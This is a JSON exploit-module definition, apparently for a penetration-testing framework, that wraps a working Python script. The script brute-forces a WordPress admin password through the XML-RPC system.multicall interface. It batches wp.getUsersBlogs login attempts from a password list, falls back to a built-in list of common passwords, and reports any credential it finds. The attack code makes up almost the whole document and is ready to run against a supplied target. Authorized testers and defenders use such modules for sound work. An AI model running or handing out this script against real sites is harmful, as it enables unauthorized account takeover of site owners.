{
  "id": "wordpress-xmlrpc-brute",
  "name": "WordPress XML-RPC Brute Force",
  "description": "This exploit targets WordPress XML-RPC interface to perform a brute force attack against the admin user. The XML-RPC functionality in WordPress allows for multiple authentication attempts in a single request, making brute force attacks more efficient.",
  "type": "custom",
  "options": {
    "target": "",
    "username": "admin",
    "password_list": "passwords.txt",
    "max_attempts": 100,
    "request_delay": 1
  },
  "references": [
    "https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html",
    "https://www.acunetix.com/vulnerabilities/web/wordpress-xml-rpc-enabled/"
  ],
  "author": "SKrulll",
  "code": "#!/usr/bin/env python\nimport sys\nimport time\nimport requests\n\n# Target information\ntarget = \"{{target}}\"\nusername = \"{{username}}\"\npassword_list = \"{{password_list}}\"\nmax_attempts = {{max_attempts}}\nrequest_delay = {{request_delay}}\n\n# Ensure target has proper URL format\nif not target.startswith('http'):\n    target = f\"http://{target}\"\n\n# XML-RPC endpoint\nxmlrpc_url = f\"{target}/xmlrpc.php\"\n\n# Function to create XML-RPC request for multiple password checks\ndef create_xmlrpc_request(passwords):\n    xml_template = \"\"\"<?xml version=\"1.0\"?>\n    <methodCall>\n        <methodName>system.multicall</methodName>\n        <params>\n            <param>\n                <value>\n                    <array>\n                        {calls}\n                    </array>\n                </value>\n            </param>\n        </params>\n    </methodCall>\"\"\"\n    \n    auth_call_template = \"\"\"<value>\n                            <struct>\n                                <member>\n                                    <name>methodName</name>\n                                    <value><string>wp.getUsersBlogs</string></value>\n                                </member>\n                                <member>\n                                    <name>params</name>\n                                    <value>\n                                        <array>\n                                            <value><string>{username}</string></value>\n                                            <value><string>{password}</string></value>\n                                        </array>\n                                    </value>\n                                </member>\n                            </struct>\n                        </value>\"\"\"\n    \n    auth_calls = []\n    for password in passwords:\n        auth_calls.append(auth_call_template.format(username=username, password=password))\n    \n    return xml_template.format(calls=\"\\n\".join(auth_calls))\n\nprint(f\"[*] Starting WordPress XML-RPC brute force against {xmlrpc_url}\")\nprint(f\"[*] Target username: {username}\")\n\n# Check if the XML-RPC endpoint is available\nprint(\"[*] Checking if XML-RPC is enabled...\")\ntry:\n    response = requests.get(xmlrpc_url)\n    if response.status_code != 200 or \"XML-RPC server accepts POST requests only\" not in response.text:\n        print(\"[-] XML-RPC endpoint not found or disabled\")\n        sys.exit(1)\n    print(\"[+] XML-RPC is enabled\")\nexcept Exception as e:\n    print(f\"[-] Error accessing XML-RPC endpoint: {str(e)}\")\n    sys.exit(1)\n\n# Load password list\ntry:\n    with open(password_list, 'r') as f:\n        passwords = [line.strip() for line in f if line.strip()]\n        if not passwords:\n            print(\"[-] Password list is empty\")\n            sys.exit(1)\n        print(f\"[*] Loaded {len(passwords)} passwords from {password_list}\")\nexcept Exception as e:\n    print(f\"[-] Error loading password list: {str(e)}\")\n    # Use a small built-in list for demonstration\n    passwords = ['admin', 'password', 'wordpress', '123456', 'admin123']\n    print(f\"[*] Using {len(passwords)} built-in passwords\")\n\n# Limit attempts\nif max_attempts > 0 and max_attempts < len(passwords):\n    passwords = passwords[:max_attempts]\n    print(f\"[*] Limited to {max_attempts} password attempts\")\n\n# Start brute force\nprint(\"[*] Starting brute force attack...\")\nfound = False\n\n# Process passwords in batches of 10 (XML-RPC multicall)\nbatch_size = 10\nfor i in range(0, len(passwords), batch_size):\n    batch = passwords[i:i+batch_size]\n    print(f\"[*] Trying batch {i//batch_size + 1}/{(len(passwords) + batch_size - 1)//batch_size}\")\n    \n    xml_request = create_xmlrpc_request(batch)\n    \n    try:\n        response = requests.post(xmlrpc_url, data=xml_request, headers={'Content-Type': 'text/xml'})\n        \n        # Check for successful authentication\n        if \"isAdmin\" in response.text:\n            # Find which password worked\n            for j, password in enumerate(batch):\n                if f\"isAdmin\" in response.text.split(\"<value>\")[j+1]:\n                    print(f\"\\n[+] SUCCESS! Password found: {password}\")\n                    found = True\n                    break\n            if found:\n                break\n    except Exception as e:\n        print(f\"[-] Error during request: {str(e)}\")\n    \n    # Respect request delay\n    if request_delay > 0:\n        time.sleep(request_delay)\n\nif not found:\n    print(\"\\n[-] Brute force attack completed - No valid credentials found\")\n    sys.exit(1)\nelse:\n    print(\"[+] Exploit successful\")\n    sys.exit(0)\n",
  "target_requirements": {
    "cms": "WordPress",
    "features": ["XML-RPC enabled"]
  }
}